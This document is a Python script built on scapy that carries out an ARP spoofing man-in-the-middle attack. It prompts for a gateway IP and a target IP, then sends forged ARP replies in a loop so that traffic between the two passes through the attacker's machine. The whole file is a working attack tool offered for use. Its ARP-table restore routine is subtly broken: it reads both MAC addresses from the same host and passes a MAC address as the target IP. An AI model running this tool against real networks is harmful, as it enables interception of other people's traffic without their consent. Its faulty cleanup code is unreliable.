# Run this using Python 3
#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

# Getting MAC Address
def get_mac(ip): # this function is responsible for returning MAC Address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #Here
    return answered_list[0][1].hwsrc

# creating ARP Response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) # Called the above function to give the
    # MAC Address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
# Now we will implement this function to give the final output i.e. to
# do flow of packets and be the Man - In - The - Middle

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)  # Called the above function to give the
    source_mac = get_mac(destination_ip)  # Called the above function to give the
    # MAC Address
    packet = scapy.ARP(op=2, pdst=destination_mac, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

gateway_ip = input("Enter the Route or Gateway IP \nHint: it mostly looks like 192.168. .1 or\ncheck 'route -n' on Your System: ")
target_ip = input("Enter the Target IP: ")
try:
    count=0
    while True:
        spoof(target_ip, gateway_ip) # Telling the target that we are the
        # router
        spoof(gateway_ip, target_ip) # Telling the router that we are
        # target
        count = count + 2
        print("\r [*] Packets Sent: ", count, end="")
        sys.stdout.flush()
        time.sleep(0.25)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C...Resetting ARP Tables... Please Wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
